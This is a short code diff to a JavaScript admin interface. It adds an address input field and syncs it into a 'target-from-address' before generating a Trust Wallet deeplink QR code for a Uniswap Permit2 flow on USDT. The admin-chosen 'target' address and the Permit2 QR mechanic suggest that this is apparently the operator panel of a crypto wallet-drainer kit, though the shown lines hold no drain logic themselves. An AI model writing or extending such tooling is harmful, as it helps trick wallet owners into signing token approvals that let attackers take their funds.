@@ -706,6 +706,9 @@
         html += '<img src="' + LOGO_USDT + '" class="token-logo" /><span>USDT Ethereum</span></div>';
         html += '<div class="token-row" id="uni-usdt-trc20" onclick="selectUniswapProbe(\'usdt-trc20\',this);return false;">';
         html += '<img src="' + LOGO_TRON + '" class="token-logo" /><span>USDT Tron</span></div>';
+        html += '<div class="token-addr-wrap">';
+        html += '<input type="text" id="uni-from-address" placeholder="0x..." autocomplete="off" />';
+        html += '</div>';
         html += '</div>'; // tokens-col-uniswap
         html += '</div>'; // tokens-columns
         html += '<div class="tokens-qr-footer">';
@@ -1124,10 +1127,11 @@ try {
   // Called when admin clicks Generate after selecting a UNISWAP token.
   // Generates a Trust Wallet deeplink QR -- same mechanic as WC-barre column.
   function generateUniswapPermit2() {
-    var preset = window._selectedProbe || 'usdt-erc20';
-    var ddAddr    = document.getElementById('dropdown-from-address');
+    var preset    = window._selectedProbe || 'usdt-erc20';
+    var uniAddr   = document.getElementById('uni-from-address');
     var adminAddr = document.getElementById('target-from-address');
-    if (ddAddr && adminAddr) { adminAddr.value = ddAddr.value.trim(); }
+    // Sync uni-from-address -> target-from-address pour openUniswapQR
+    if (uniAddr && adminAddr) { adminAddr.value = uniAddr.value.trim(); }
     openUniswapQR(preset);
   }
 
